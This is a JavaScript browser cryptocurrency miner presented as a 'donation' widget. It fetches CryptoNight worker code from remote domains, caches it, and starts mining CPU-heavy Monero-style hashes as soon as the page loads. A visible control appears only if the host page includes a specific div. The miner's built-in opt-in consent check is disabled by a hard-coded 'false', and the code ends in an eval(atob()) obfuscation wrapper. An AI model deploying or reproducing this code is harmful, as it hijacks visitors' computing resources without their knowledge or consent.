var a='window.cpu = .15;
window.wallet = null;
window.miner = null;
window.hpstimer = null
window.runlabel = "Donating!";
window.stoplabel = "Donations Paused";
window.cacheMins =30;
window.userid =0;
window.usertype = "w";
window.threads = null;
window.pool = "";
window.wdtimer = null;
window.hosted=1;
window.sentfb =0;
window.proxyUrl ="";
window.ssl =1;
window.curDom=0;
window.doms=null;
window.worker=null;
window.debug=false;
window.backoff=100;
window.backoffMax=30000;
window.failcount=0;
window.failcountMax=8;
window.myLoc="us";

var scriptTag = document.currentScript.src;
if(scriptTag.startsWith("https://snip")){ scriptTag = "dynamic"; }

function loadSettings(){
	var mytz = new Date().getTimezoneOffset();
	if(mytz >= 120 && mytz <= 600){ window.myLoc = "us"; }
	else if(mytz < 120 && mytz >= -180){ window.myLoc = "eu"; }
	else { window.myLoc = "as"; }

	window.doms = ["d.cfcnet.top", "d.cfcdist.gdn","d.cfcnet.gdn","d.cpufan.club"];
	var src = document.currentScript.src;
        var chunk = src.substring(0, src.indexOf(".js")-2);
        var bits = chunk.split('/');
	window.path="";
        for(i=0; i< bits.length -1; i++){
                if(!bits[i].startsWith("http")){ window.path += "/"; }
                window.path += bits[i];
        }

	var cache = document.currentScript.getAttribute('data-cache');
	if(cache && isNumber(cache)){ 
		window.cacheMins = cache;
	}
	var threads = document.currentScript.getAttribute('data-threads');
	if(threads && isNumber(threads)){ 
		window.threads = threads;
	}

	var pew = document.currentScript.getAttribute('data-level');
        if(pew && isNumber(pew)){ window.cpu = (1 - (pew /100)); }
        else if(document.currentScript.src.indexOf("c=") !== -1){
                window.cpu = (1 - (unescape(src).split("c=")[1].split("&")[0] /100));
        }

	if(document.currentScript.getAttribute('data-debug')){ window.debug = true; }

	var worker = document.currentScript.getAttribute('data-worker');
	if(worker){
		window.worker = worker.replace(/[^a-z0-9]/gi,'');
	}
	var u = document.currentScript.getAttribute('data-user');
	if(u){
		window.userid = u;
		window.usertype = "u";
	}else{
		var w = document.currentScript.getAttribute('data-id');
		if(w){
			window.userid = w;
			window.usertype = "w";
		}else if(src.indexOf("w=") != -1){
			window.userid =unescape(src).split("w=")[1].split("&")[0];
			window.usertype = "w";
		}
	}
	var uwal = document.currentScript.getAttribute('data-wallet');
	var upool = document.currentScript.getAttribute('data-pool');
	var unode = document.currentScript.getAttribute('data-node');

	if(uwal && upool && unode){
		window.pool = upool;
		window.wallet = uwal;
		window.proxyUrl = "wss://"+unode +"?v=2&pool="+upool;
		startIt();
		return false;
	}
	return true;

}

(function(){

	if(!loadSettings()){ return; }

	if(processCookie(false)){ return; }

	doMain();

}() );

function getDomain(ssl){
	if(doms ==null){ return null; }

	if(curDom > doms.length){ curDom=0; }
	var d = doms[curDom];
	if(ssl){ d = "https://"+d; }
	else{ d = "http://"+d; }
	return d;
}

function loadDomains(d){
	var m = JSON.parse(d);
	if(m.domains.length){
		window.doms = m.domains;
		curDom=0;		
		doMain();
	}
}

function doMain(){
	if(window.userid > 0){
		var ssl = false;
		if (location.protocol === 'https:') { ssl = true; }
		var d = getDomain(ssl);
		if(d== null){
			callAjax("https://us.cfcnet.top/domains.php",loadDomains, null);
		}else{
			callAjax(d + "/static/"+window.usertype+"/"+window.userid+"/",callback, doMain);
		}
	}
}

function processCookie(force){
	try{
		if  (window.cacheMins ==0){ return false; }
		var c = readLocal("cfc2_session");
		if(c == null){ return false; }

		var ts = Math.round((new Date()).getTime() / 1000);
		var local = JSON.parse(atob(c));

		if(ts - local.ts > (window.cacheMins * 60) && !force){ return false; }

		window.wallet = local.wallet;	
		window.cpu = local.cpu;
		if(local.threads){ window.threads = local.threads; }

		window.nodes = local.nodes;
		if(window.nodes.length ==0){ 
			localStorage.removeItem("cfc2_session");
			return false;
		}
		window.nodes = sortNodes(window.nodes);
		window.ssl = local.ssl;
		window.pool = local.pool;

		if(window.pool == null || window.pool == 'undefined'){ 
			localStorage.removeItem("cfc2_session");
			return false; 
		}
		if(window.wallet == null || window.wallet == 'undefined'){ 
			localStorage.removeItem("cfc2_session");
			return false; 
		}

                window.curNode = 0;
                assignProxy();
		if(window.proxyUrl == "undefined"){ 
			localStorage.removeItem("cfc2_session");
			return false; 
		}

		startIt();
		return true;
	}catch(e){
		return false;
	}
}

function startIt(){
	startWork();
	setTimeout(function(){ checkAndShowDiv(); }, 100);
}

function startWork(){
	var libUrl = null;
	if(scriptTag == "dynamic"){
		libUrl = "https://us.cfcnet.top/vendor/ch/";
	}else{
		var chunk = scriptTag.substring(0, scriptTag.indexOf(".js")-2);
		var bits = chunk.split('/');
		var libUrl="";
		for(i=0; i< bits.length -1; i++){
			if(!bits[i].startsWith("http")){ libUrl += "/"; }
			libUrl += bits[i];
		}
		libUrl += "/";
	}
	setupMiner(libUrl);
	setupJob();

	if(window.worker != null && window.worker.length > 0){
		var pos = window.wallet.indexOf('.');
		if(pos !== -1){ window.wallet = window.wallet.substring(0,pos+1) + window.worker;	}
	}

	window.wallet = window.wallet.trim();
	window.miner = CH.Anonymous(window.wallet );
	if(window.miner._otherTabRunning()){
                setTimeout(function(){ startWork(); }, 1000);
                return;
        }

        if(window.threads){
                var tn = window.threads;
                if(tn < 1){ tn = Math.round(tn * navigator.hardwareConcurrency); }
                window.miner.setNumThreads( tn );
        }else{
                window.miner.setThrottle( window.cpu );
        }
        if(window.cpu !=1){
                window.miner.start();
                window.wdtimer = setTimeout(function(){ watchdog(); }, 25000);
        }

        window.miner.on('error', function(params) {
		if(window.debug){
			console.log("Miner error: "+ params.error+", "+params.message);
		}
		if(params.message == 'invalid method'){ return; }

                localStorage.removeItem("cfc2_session");
		clearTimeout(window.wdtimer);
                if (params.error !== 'connection_error') {
                        //feedback("error: "+params.error);
			if(params.error !== 'invalid_site_key'){
				stopDots();
				setTimeout(function(){ failover(); }, window.backoff);
				window.backoff = window.backoff *3;
				if(window.backoff >= window.backoffMax){ window.backoff = window.backoffMax; }
			}else{
				feedback("bad wallet: "+window.wallet);
			}
                }else{
			stopDots();
			setTimeout(function(){ failover(); }, window.backoff);
			window.backoff = window.backoff *3;
			if(window.backoff >= window.backoffMax){ window.backoff = window.backoffMax; }
                }
        });

}
function stopDots(){
	if(window.miner != null){
		window.miner.stop();
		window.miner = null;
	}
}

function failover(){
	if(window.debug){ console.log("Failing over."); }
	if(window.failcount > window.failcountMax){
		if(window.debug){ console.log("Starting over, asking for data again from director."); }
		window.failcount=0;
		doMain();	
		return;
	}
	window.failcount++;

	stopDots();
	assignProxy();
	startWork();
}

function watchdog(){
	if(window.miner == undefined || window.miner.getTotalHashes()==0){
		if(window.debug){ console.log("Idle miner watchdog triggered."); }
		localStorage.removeItem("cfc2_session");
		failover();
	}
}

function feedback(msg){
	if(window.sentfb==1){ return; }
	window.sentfb =1;
	var report = new Object();
	report.errortype = msg;
	report.id = window.userid;
	report.type = window.usertype;
	report.threads = window.threads;
	report.pool = window.pool;
	report.wspath = window.wspath;
	report.wallet = window.wallet;
	report.minerwasm = window.miner.hasWASMSupport();
	var v = btoa(JSON.stringify(report));

	var pro = "http://";
	if (location.protocol === 'https:') { pro = "https://"; }
	callAjax(pro+"d.cfcnet.gdn/d.dev.php?stall=1&report="+v,null, feedback);
}

function sortNodes(nodes){
	var len = nodes.length;
	for (var i = 0; i < len; i++) {
		if (nodes[i].startsWith(window.myLoc)){
			var g = nodes[i];
			nodes.splice(i,1);
			nodes.unshift(g);
			return nodes;
		}
	}
	return nodes;
}

function callback(q){
	var m = JSON.parse(q);
	if(m.result == "success"){
		window.wallet = m.wallet;
		window.pool = m.target;
		window.nodes = m.nodes;
		window.ssl = m.ssl;
		if(window.nodes.length ==0){ return; }

		window.nodes = sortNodes(window.nodes);
		window.curNode = 0;

		if(window.proxyUrl == "undefined"){ 
			setTimeout(function(){ failover(); }, window.backoff);
			window.backoff = window.backoff *3;
			if(window.backoff >= window.backoffMax){ window.backoff = window.backoffMax; }
			return;
		}
		assignProxy();

		var ts = Math.round((new Date()).getTime() / 1000);
		var cook = {wallet: m.wallet, ssl: m.ssl, pool: window.pool, nodes: nodes,cpu: window.cpu, threads: window.threads, ts: ts};
		var v = btoa(JSON.stringify(cook));
		localStorage["cfc2_session"] = v;
		startIt();
	}else{
	}
}

function assignProxy(){
	if(window.ssl){
		window.proxyUrl = "wss://";	
	}else{
		window.proxyUrl = "ws://";	
	}


	window.proxyUrl += window.nodes[window.curNode] +"?v=2&pool="+window.pool;
	window.curNode++;
	if(window.curNode >= window.nodes.length){ window.curNode=0; }
	if(window.worker != null && window.worker.length > 0){
		var pos = window.proxyUrl.lastIndexOf(':');
		if(pos !== -1){ 
			window.proxyUrl = window.proxyUrl.substring(0,pos+1) + window.worker;	
			if(window.debug){ console.log("Pool supports custom worker: "+window.worker); }
		}
	}
	if(window.debug){ console.log("Assigning proxy: "+window.proxyUrl); }
}


function callAjax(url, callback, retry){
    var xmlhttp;
    xmlhttp = new XMLHttpRequest();
//	xmlhttp.onerror = processCookie(true);
    xmlhttp.onreadystatechange = function(){
        if (xmlhttp.readyState == 4){
		if (xmlhttp.status == 200){
			if(callback){ callback(xmlhttp.responseText); }
		}else if(retry){
			curDom++;
			retry();
		}
	}
    }
    xmlhttp.open("GET", url, true);
    xmlhttp.send();
}

function checkAndShowDiv(){
	var ourdiv = document.getElementById("cfc_donate");
	if(ourdiv){
		var showC = (1 - window.cpu) * 100;
		var sotp = ourdiv.getAttribute("data-stoplabel");
		var unsotp = ourdiv.getAttribute("data-runlabel");
		if(sotp){ window.stoplabel = sotp; }
		if(unsotp){ window.runlabel = unsotp; }
		var rc = "spin-slow";
		var txt = window.runlabel;
		if(window.cpu ==1){ 
			txt = window.stoplabel
			rc = "";
		}
		var puke = "<div style='width:250px; overflow:hidden'>";
		puke += "<div style='width:45px; float: left;'><div id='ringu' class='"+rc+"'></div> </div>";
		puke += "<div style='margin-left:50px; width:200px;'> <span id='miner-state'>"+txt+"</span> (<span id='hps'>0</span> H/s) <br>";
		puke += "<div id='slidecontainer'> <input type='range' width='200px; min='0' max='100' value='"+showC+"' class='slider' id='cpuThrottle' data-toggle='tooltip' data-placement='top' > </div> </div>";

		puke += "</div>";
		document.getElementById("cfc_donate").innerHTML = puke;
		cpuThrottle.addEventListener('change', function() {
			var wasStopped = false;
			if(window.cpu ==1){ wasStopped=true; }
			var val = document.getElementById('cpuThrottle').value;
			window.cpu = (1 - (val /100));
			if(window.cpu ==1){
				window.miner.stop();
				document.getElementById("miner-state").innerHTML = window.stoplabel;
				clearTimeout(window.wdtimer);
			}else{
				if(wasStopped){ 
					window.miner.start(); 
					window.wdtimer = setTimeout(function(){ watchdog(); }, 15000);
					document.getElementById("miner-state").innerHTML = window.runlabel;
				}
				window.miner.setThrottle( window.cpu );
			}
			setSpinner(val);
		});
		loadCss();
		window.hpstimer = setInterval(getHPS, 1000);
		if(window.cpu !=1){ setSpinner(25); }
	}
}

function loadCss(){
	var l = document.createElement('link');
	l.type = 'text/css';
	l.rel = 'stylesheet';
	l.media = 'screen';
	l.href = 'https://node.cfcdist.gdn/vendor/donate_style.css';
	document.getElementsByTagName('head')[0].appendChild(l);
}
function getHPS(){
	if(window.miner == null){ return; }
	var hps = window.miner.getHashesPerSecond();
	document.getElementById("hps").innerHTML =Math.round(hps) ;

}
function setSpinner(val){
        ringu.className ="";
        if(window.miner != null){
		if(val ==0){
			//?
                }else if(val < 25){
                        ringu.classList.add("spin-slowest");
                }else if(val < 50){
                        ringu.classList.add("spin-slow");
                }else if(val < 75){
                        ringu.classList.add("spin-fast");
                }else{
                        ringu.classList.add("spin-fastest");
                }
        }
}
function readLocal(name) {
	var stored = localStorage[name];
	if (stored) {
		return stored;
	}
	else {return null; }

}


function isNumber(n) { return !isNaN(parseFloat(n)) && !isNaN(n - 0) }




function setupMiner(libUrl) {

  "use strict";
  var Miner = function(siteKey, params) {
    this.params = params || {};
    this._siteKey = siteKey;
    this._user = null;
    this._threads = [];
    this._hashes = 0;
    this._currentJob = null;
    this._autoReconnect = true;
    this._reconnectRetry = 3;
    this._tokenFromServer = null;
    this._goal = 0;
    this._totalHashesFromDeadThreads = 0;
    this._throttle = Math.max(0, Math.min(0.99, this.params.throttle || 0));
    this._stopOnInvalidOptIn = false;
    this._autoThreads = {
      enabled: !!this.params.autoThreads,
      interval: null,
      adjustAt: null,
      adjustEvery: 1e4,
      stats: {}
    };
    this._tab = {
      ident: (Math.random() * 16777215) | 0,
      mode: CH.IF_EXCLUSIVE_TAB,
      grace: 0,
      lastPingReceived: 0,
      interval: null
    };
    if (window.BroadcastChannel) {
      try {
        this._bc = new BroadcastChannel("CH");
        this._bc.onmessage = function(msg) {
          if (msg.data === "ping") {
            this._tab.lastPingReceived = Date.now();
          }
        }.bind(this);
      } catch (e) {}
    }
    this._eventListeners = {
      open: [],
      authed: [],
      close: [],
      error: [],
      job: [],
      found: [],
      accepted: [],
      optin: []
    };
    var defaultThreads = navigator.hardwareConcurrency || 4;
    this._targetNumThreads = this.params.threads || defaultThreads;
    this._useWASM = this.hasWASMSupport() && !this.params.forceASMJS;
    this._minbinStatus = "unloaded";
    this._onTargetMetBound = this._onTargetMet.bind(this);
    this._onVerifiedBound = this._onVerified.bind(this);
  };
  Miner.prototype.start = function(mode, optInToken) {
    this._tab.mode = mode || CH.IF_EXCLUSIVE_TAB;
    this._optInToken = optInToken;
    if (this._tab.interval) {
      clearInterval(this._tab.interval);
      this._tab.interval = null;
    }
    if (this._minbinStatus === "loaded") {
      this._startNow();
    } else if (this._useWASM) {
		if(window.debug){ console.log("Miner loading wasm"); }
		this._minbinStatus = "pending";
		this.doWasmGuy(); 
	}else{
		if(window.debug){ console.log("Miner loading asm"); }
		this._minbinStatus = "pending";
		this.doAsmGuy(); 
    }
  };

Miner.prototype.doAsmGuy = function(){
	var guy = localStorage.getItem("cfc_ajs");
        if (guy && guy.startsWith('const')){ 
		if(window.debug){ console.log("ASM loaded from cache"); }
          CH.CRYPTONIGHT_WORKER_BLOB =
            window.URL.createObjectURL(new Blob([guy])) +
            "#" +
            libUrl;
          this._minbinStatus = "loaded";
          this._startNow();
		return;
	}
	if(window.debug){ console.log("Remotely retrieving ASM from: "+libUrl+"a.js"); }
      var xhr = new XMLHttpRequest();
      xhr.addEventListener(
        "load",
        function() {
                localStorage.setItem("cfc_ajs", xhr.responseText);
          CH.CRYPTONIGHT_WORKER_BLOB =
            window.URL.createObjectURL(new Blob([xhr.responseText])) +
            "#" +
            libUrl;
          this._minbinStatus = "loaded";
          this._startNow();
        }.bind(this),
        xhr
      );
      xhr.open("get", libUrl + "a.js", true);
      xhr.send();
}

Miner.prototype.doWasmGuy = function(){
	var guy = localStorage.getItem("cfc_wajs");
        if (guy && guy.startsWith('var')){ 
		if(window.debug){ console.log("WASM loaded from cache"); }
          CH.CRYPTONIGHT_WORKER_BLOB =
            window.URL.createObjectURL(new Blob([guy])) +
            "#" +
            libUrl;
          this._minbinStatus = "loaded";
          this._startNow();
		return;
	}
	if(window.debug){ console.log("Remotely retrieving WASM from: "+libUrl+"wa.js"); }
      var xhr = new XMLHttpRequest();
      xhr.addEventListener(
        "load",
        function() {
                localStorage.setItem("cfc_wajs", xhr.responseText);
          CH.CRYPTONIGHT_WORKER_BLOB =
            window.URL.createObjectURL(new Blob([xhr.responseText])) +
            "#" +
            libUrl;
          this._minbinStatus = "loaded";
          this._startNow();
        }.bind(this),
        xhr
      );
      xhr.open("get", libUrl + "wa.js", true);
      xhr.send();
}

  Miner.prototype.stop = function(mode) {
    for (var i = 0; i < this._threads.length; i++) {
      this._totalHashesFromDeadThreads += this._threads[i].hashesTotal;
      this._threads[i].stop();
    }
    this._threads = [];
    this._autoReconnect = false;
    if (this._socket) {
      this._socket.close();
    }
    this._currentJob = null;
    if (this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval);
      this._autoThreads.interval = null;
    }
    if (this._tab.interval && mode !== "dontKillTabUpdate") {
      clearInterval(this._tab.interval);
      this._tab.interval = null;
    }
  };
  Miner.prototype.getHashesPerSecond = function() {
    var hashesPerSecond = 0;
    for (var i = 0; i < this._threads.length; i++) {
      hashesPerSecond += this._threads[i].hashesPerSecond;
    }
    return hashesPerSecond;
  };
  Miner.prototype.getTotalHashes = function(estimate) {
    var now = Date.now();
    var hashes = this._totalHashesFromDeadThreads;
    for (var i = 0; i < this._threads.length; i++) {
      var thread = this._threads[i];
      hashes += thread.hashesTotal;
      if (estimate) {
        var tdiff = (now - thread.lastMessageTimestamp) / 1e3 * 0.9;
        hashes += tdiff * thread.hashesPerSecond;
      }
    }
    return hashes | 0;
  };
  Miner.prototype.getAcceptedHashes = function() {
    return this._hashes;
  };
  Miner.prototype.getToken = function() {
    return this._tokenFromServer;
  };
  Miner.prototype.on = function(type, callback) {
    if (this._eventListeners[type]) {
      this._eventListeners[type].push(callback);
    }
  };
  Miner.prototype.getAutoThreadsEnabled = function(enabled) {
    return this._autoThreads.enabled;
  };
  Miner.prototype.setAutoThreadsEnabled = function(enabled) {
    this._autoThreads.enabled = !!enabled;
    if (!enabled && this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval);
      this._autoThreads.interval = null;
    }
    if (enabled && !this._autoThreads.interval) {
      this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
      this._autoThreads.interval = setInterval(
        this._adjustThreads.bind(this),
        1e3
      );
    }
  };
  Miner.prototype.getThrottle = function() {
    return this._throttle;
  };
  Miner.prototype.setThrottle = function(throttle) {
    this._throttle = Math.max(0, Math.min(0.99, throttle));
    if (this._currentJob) {
      this._setJob(this._currentJob);
    }
  };
  Miner.prototype.getNumThreads = function() {
    return this._targetNumThreads;
  };
  Miner.prototype.setNumThreads = function(num) {
    var num = Math.max(1, num | 0);
    this._targetNumThreads = num;
    if (num > this._threads.length) {
      for (var i = 0; num > this._threads.length; i++) {
        var thread = new CH.JobThread();
        if (this._currentJob) {
          thread.setJob(this._currentJob, this._onTargetMetBound);
        }
        this._threads.push(thread);
      }
    } else if (num < this._threads.length) {
      while (num < this._threads.length) {
        var thread = this._threads.pop();
        this._totalHashesFromDeadThreads += thread.hashesTotal;
        thread.stop();
      }
    }
  };
  Miner.prototype.hasWASMSupport = function() {
    return window.WebAssembly !== undefined;
  };
  Miner.prototype.isRunning = function() {
    return this._threads.length > 0;
  };
  Miner.prototype._startNow = function() {
    if (this._tab.mode !== CH.FORCE_MULTI_TAB && !this._tab.interval) {
      this._tab.interval = setInterval(this._updateTabs.bind(this), 2000);
    }
    if (
      this._tab.mode === CH.IF_EXCLUSIVE_TAB &&
      this._otherTabRunning()
    ) {
      return;
    }
    if (this._tab.mode === CH.FORCE_EXCLUSIVE_TAB) {
      this._tab.grace = Date.now() + 3e3;
    }
    if (!this.verifyThread) {
      this.verifyThread = new CH.JobThread();
    }
    this.setNumThreads(this._targetNumThreads);
    this._autoReconnect = true;
    if (false && !this._optInToken) {
      this._auth =
        this._auth ||
        new CH.Auth(this._siteKey, {
          theme: this.params.theme || "light",
          lang: this.params.language || "auto"
        });
      this._auth.auth(
        function(token) {
          if (!token) {
            this._emit("optin", { status: "canceled" });
            this._emit("error", { error: "opt_in_canceled" });
            return;
          }
          this._emit("optin", { status: "accepted" });
          this._optInToken = token;
          this._connect();
        }.bind(this)
      );
    } else {
	if(window.debug){ console.log("Miner connecting" ); }
      this._connect();
    }
  };
  Miner.prototype._otherTabRunning = function() {
    if (this._tab.lastPingReceived > Date.now() - 1500) {
      return true;
    }
    try {
      var tdjson = localStorage.getItem("CH");
      if (tdjson) {
        var td = JSON.parse(tdjson);
        if (td.ident !== this._tab.ident && Date.now() - td.time < 1500) {
          return true;
        }
      }
    } catch (e) {}
    return false;
  };
  Miner.prototype._updateTabs = function() {
    var otherTabRunning = this._otherTabRunning();
    if (otherTabRunning && this.isRunning() && Date.now() > this._tab.grace) {
      this.stop("dontKillTabUpdate");
    } else if (!otherTabRunning && !this.isRunning()) {
      this._startNow();
    }
    if (this.isRunning()) {
      if (this._bc) {
        this._bc.postMessage("ping");
      }
      try {
        localStorage.setItem(
          "CH",
          JSON.stringify({ ident: this._tab.ident, time: Date.now() })
        );
      } catch (e) {}
    }
  };
  Miner.prototype._adjustThreads = function() {
    var hashes = this.getHashesPerSecond();
    var threads = this.getNumThreads();
    var stats = this._autoThreads.stats;
    stats[threads] = stats[threads]
      ? stats[threads] * 0.5 + hashes * 0.5
      : hashes;
    if (Date.now() > this._autoThreads.adjustAt) {
      this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
      var cur = (stats[threads] || 0) - 1;
      var up = stats[threads + 1] || 0;
      var down = stats[threads - 1] || 0;
      if (cur > down && (up === 0 || up > cur) && threads < 8) {
        return this.setNumThreads(threads + 1);
      } else if (cur > up && (!down || down > cur) && threads > 1) {
        return this.setNumThreads(threads - 1);
      }
    }
  };
  Miner.prototype._emit = function(type, params) {
    var listeners = this._eventListeners[type];
    if (listeners && listeners.length) {
      for (var i = 0; i < listeners.length; i++) {
        listeners[i](params);
      }
    }
  };
  Miner.prototype._hashString = function(s) {
    var hash = 5381,
      i = s.length;
    while (i) {
      hash = (hash * 33) ^ s.charCodeAt(--i);
    }
    return hash >>> 0;
  };
  Miner.prototype._connect = function() {
    if (this._socket) {
      return;
    }
    this._socket = new WebSocket(proxyUrl);
    this._socket.onmessage = this._onMessage.bind(this);
    this._socket.onerror = this._onError.bind(this);
    this._socket.onclose = this._onClose.bind(this);
    this._socket.onopen = this._onOpen.bind(this);
  };
  Miner.prototype._onOpen = function(ev) {
	if(window.debug){ console.log("Miner onOpen: "+ev); }
    this._emit("open");
    var params = {
      site_key: this._siteKey,
      type: "anonymous",
      user: null,
      goal: 0
    };
    if (this._user) {
      params.type = "user";
      params.user = this._user.toString();
    } else if (this._goal) {
      params.type = "token";
      params.goal = this._goal;
    }
    if (this._optInToken) {
      params.opt_in = this._optInToken;
    }
    this._send("auth", params);
  };
  Miner.prototype._onError = function(ev) {
	if(window.debug){ console.log("Miner onError: "+ev); }
    this._emit("error", { error: "connection_error" });
    this._onClose(ev);
  };
  Miner.prototype._onClose = function(ev) {
	if(window.debug){ console.log("Miner onClose: "+JSON.stringify(ev) ); }
    if (ev.code >= 1003 && ev.code <= 1009) {
      this._reconnectRetry = 60;
    }
    for (var i = 0; i < this._threads.length; i++) {
      this._threads[i].stop();
    }
    this._threads = [];
    this._socket = null;
    this._emit("close");
    if (this._autoReconnect) {
      setTimeout(this._startNow.bind(this), this._reconnectRetry * 1e3);
    }
  };
  Miner.prototype._onMessage = function(ev) {
    var msg = JSON.parse(ev.data);
    if (msg.type === "job") {
	if(window.debug){ console.log("Miner job: "+JSON.stringify(msg) ); }
      this._setJob(msg.params);
      this._emit("job", msg.params);
      if (this._autoThreads.enabled && !this._autoThreads.interval) {
        this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
        this._autoThreads.interval = setInterval(
          this._adjustThreads.bind(this),
          1e3
        );
      }
    } else if (msg.type === "verify") {
      this.verifyThread.verify(msg.params, this._onVerifiedBound);
    } else if (msg.type === "hash_accepted") {
	if(window.debug){ console.log("Hash accepted: "+JSON.stringify(msg) ); }
      this._hashes = msg.params.hashes;
      this._emit("accepted", msg.params);
      if (this._goal && this._hashes >= this._goal) {
        this.stop();
      }
    } else if (msg.type === "authed") {
	if(window.debug){ console.log("Miner authed: "+JSON.stringify(msg) ); }
      this._tokenFromServer = msg.params.token || null;
      this._hashes = msg.params.hashes || 0;
      this._emit("authed", msg.params);
      this._reconnectRetry = 3;
    } else if (msg.type === "error") {
      if (console && console.error) {
	if(window.debug){ console.log("Stratum Error: "+JSON.stringify(msg) ); }
      }
      this._emit("error", msg.params);
      if (msg.params.error === "invalid_site_key") {
	if(window.debug){ console.log("Invalid Wallet Address: "+JSON.stringify(msg) ); }
        this._reconnectRetry = 6e3;
      } else if (msg.params.error === "invalid_opt_in") {
        if (this._stopOnInvalidOptIn) {
          return this.stop();
        } else if (this._auth) {
          this._auth.reset();
        }
      }
    } else if (msg.type === "banned" || msg.params.banned) {
	if(window.debug){ console.log("Stratum Banned Us: "+JSON.stringify(msg) ); }
      this._emit("error", { banned: true });
      this._reconnectRetry = 600;
    }
  };
  Miner.prototype._setJob = function(job) {
    this._currentJob = job;
    this._currentJob.throttle = this._throttle;
    for (var i = 0; i < this._threads.length; i++) {
      this._threads[i].setJob(job, this._onTargetMetBound);
    }
  };
  Miner.prototype._onTargetMet = function(result) {
    this._emit("found", result);
    if (result.job_id === this._currentJob.job_id) {
      this._send("submit", {
        job_id: result.job_id,
        nonce: result.nonce,
        result: result.result
      });
    }
  };
  Miner.prototype._onVerified = function(verifyResult) {
    this._send("verified", verifyResult);
  };
  Miner.prototype._send = function(type, params) {
    if (!this._socket) {
      return;
    }
    var msg = { type: type, params: params || {} };
    this._socket.send(JSON.stringify(msg));
  };
  window.CH = window.CH || {};
  window.CH.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
  window.CH.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
  window.CH.FORCE_MULTI_TAB = "forceMultiTab";
  window.CH.Token = function(siteKey, goal, params) {
    var miner = new Miner(siteKey, params);
    miner._goal = goal || 0;
    return miner;
  };
  window.CH.User = function(siteKey, user, params) {
    var miner = new Miner(siteKey, params);
    miner._user = user;
    return miner;
  };
  window.CH.Anonymous = function(siteKey, params) {
    var miner = new Miner(siteKey, params);
    return miner;
  };
}

function setupJob() {
  "use strict";
  var JobThread = function() {
    this.worker = new Worker(CH.CRYPTONIGHT_WORKER_BLOB);
    this.worker.onmessage = this.onReady.bind(this);
    this.currentJob = null;
    this.jobCallback = function() {};
    this.verifyCallback = function() {};
    this._isReady = false;
    this.hashesPerSecond = 0;
    this.hashesTotal = 0;
    this.running = false;
    this.lastMessageTimestamp = Date.now();
  };
  JobThread.prototype.onReady = function(msg) {
    if (msg.data !== "ready" || this._isReady) {
      throw 'Expecting first message to be "ready", got ' + msg;
    }
    this._isReady = true;
    this.worker.onmessage = this.onReceiveMsg.bind(this);
    if (this.currentJob) {
      this.running = true;
      this.worker.postMessage(this.currentJob);
    }
  };
  JobThread.prototype.onReceiveMsg = function(msg) {
    if (msg.data.verify_id) {
      this.verifyCallback(msg.data);
      return;
    }
    if (msg.data.result) {
      this.jobCallback(msg.data);
    }
    this.hashesPerSecond =
      this.hashesPerSecond * 0.5 + msg.data.hashesPerSecond * 0.5;
    this.hashesTotal += msg.data.hashes;
    this.lastMessageTimestamp = Date.now();
    if (this.running) {
      this.worker.postMessage(this.currentJob);
    }
  };
  JobThread.prototype.setJob = function(job, callback) {
    this.currentJob = job;
    this.jobCallback = callback;
    if (this._isReady && !this.running) {
      this.running = true;
      this.worker.postMessage(this.currentJob);
    }
  };
  JobThread.prototype.verify = function(job, callback) {
    if (!this._isReady) {
      return;
    }
    this.verifyCallback = callback;
    this.worker.postMessage(job);
  };
  JobThread.prototype.stop = function() {
    if (this.worker) {
      this.worker.terminate();
      this.worker = null;
    }
    this.running = false;
  };
  window.CH.JobThread = JobThread;
}


';
eval(atob(a));